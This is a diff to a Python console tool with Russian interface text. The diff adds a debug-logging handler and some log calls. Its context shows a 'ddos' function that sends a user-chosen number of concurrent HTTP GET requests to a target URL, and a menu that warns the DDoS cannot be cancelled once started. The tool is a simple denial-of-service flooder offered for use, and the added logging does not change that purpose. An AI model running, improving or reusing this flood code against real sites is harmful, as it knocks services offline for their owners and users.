@@ -1,12 +1,40 @@
-from colorama import Fore
+from colorama import Fore, Style
 from bin import config
 import time, os, configparser, sys, sqlite3, importlib.util, requests, concurrent.futures, argparse
 
 cnf = configparser.ConfigParser()
 cnf.read('config.ini')
 core_version = cnf["core"]["version"]
+is_debug = cnf['core']['debug'].lower() == 'true'
 
-def clear(): os.system('cls' if os.name == 'nt' else 'clear')
+def handler(command=None, message=None):
+    if is_debug is False:
+        return
+
+    if command is not None and str(command).lower() == "init":
+        print(f'{Fore.CYAN}[INFO]{Fore.GREEN} Обработчик инициализирован | handler{Style.RESET_ALL}')
+    elif command is not None and message:
+        command = str(command).lower()
+        color_map = {
+            'info': Fore.CYAN,
+            'error': Fore.RED,
+            'warning': Fore.YELLOW,
+            'success': Fore.GREEN,
+            'fatal error': Fore.RED
+        }
+        color = color_map.get(command, Fore.WHITE)
+        print(f'{color}[{command.upper()}]{Fore.GREEN} {message}{Style.RESET_ALL}')
+        if command == 'fatal error':
+            exit(500)
+    else:
+        print(f'{Fore.MAGENTA}[INFO] Пустой вызов обработчика{Style.RESET_ALL}')
+    
+    time.sleep(1)
+
+def clear(): 
+    os.system('cls' if os.name == 'nt' else 'clear')
+    handler('info', 'Очистка консоли')
+
 def ddos(url, amount):
     with concurrent.futures.ThreadPoolExecutor() as executor:
         futures = [executor.submit(requests.get, url) for _ in range(int(amount))]
@@ -16,7 +44,9 @@ def ddos(url, amount):
             a+=1
     print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
     return time.sleep(4)
+
 def download_lib(url, save_path, file_name):
+    handler('info', 'Загрузка библиотеки')
     try:
         response = requests.get(url)
         if response.status_code == 200:
@@ -64,6 +94,7 @@ def start():
         exit()
     
     if a == 0:
+        handler('info', 'Завершение работы')
         exit(1)
     if a == 1:
         print(Fore.RED + 'ВНИМАНИЕ! Процесс DDOSa отменить будет невозможно!')
@@ -73,6 +104,7 @@ def start():
         return start()
     elif a == 2:
         if config.LIBS_FOLDER not in sys.path:
+            handler('info', 'Иницилизация библиотек')
             sys.path.append(config.LIBS_FOLDER)
 
         sql, cursor = config.init_database()
@@ -148,7 +180,8 @@ def start():
         ok = input(Fore.YELLOW + 'OK>>> ' + Fore.RESET)
         return restart()
     else:
-        print(Fore.RED + 'Command not found' + Fore.RESET)
+        print(Fore.RED + 'Команда не найдена' + Fore.RESET)
+        handler('error', 'Команда не найдена')
         sql.close()
         time.sleep(1)
         return restart()
